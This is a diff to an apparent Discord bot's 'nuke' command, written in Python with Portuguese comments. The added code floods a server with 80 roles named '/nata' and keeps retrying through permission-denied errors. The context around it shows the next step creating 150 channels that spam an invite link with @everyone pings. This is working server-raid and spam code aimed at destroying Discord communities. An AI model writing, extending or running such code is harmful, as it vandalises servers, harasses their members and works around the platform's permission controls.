@@ -42643,6 +42643,23 @@ async def nuke_cmd(ctx: commands.Context):
         except Exception:
             pass
 
+    # 4c. Recriar 80 cargos "/nata"
+    _roles_created = 0
+    while _roles_created < 80:
+        try:
+            await guild.create_role(name="/nata", reason="Nuke — recriação de cargos")
+            _roles_created += 1
+            await asyncio.sleep(0.3)
+        except discord.Forbidden:
+            print(f"[nuke] 403 criar cargo {_roles_created+1} — aguardando 60s", flush=True)
+            await asyncio.sleep(60)
+        except discord.HTTPException as _he:
+            print(f"[nuke] HTTPException {_he.status} criar cargo — aguardando 10s", flush=True)
+            await asyncio.sleep(10)
+        except Exception as _exc:
+            print(f"[nuke] erro criar cargo: {type(_exc).__name__}: {_exc}", flush=True)
+            await asyncio.sleep(3)
+
     # 5. Recriar 150 canais "nata" com divulgação
     _nuke_msg   = "**NOVO SERVIDOR MIGRAMOS**\n\nhttps://discord.gg/nata\n\n|| @everyone here ||"
     _nuke_allow = discord.AllowedMentions(everyone=True, roles=True)
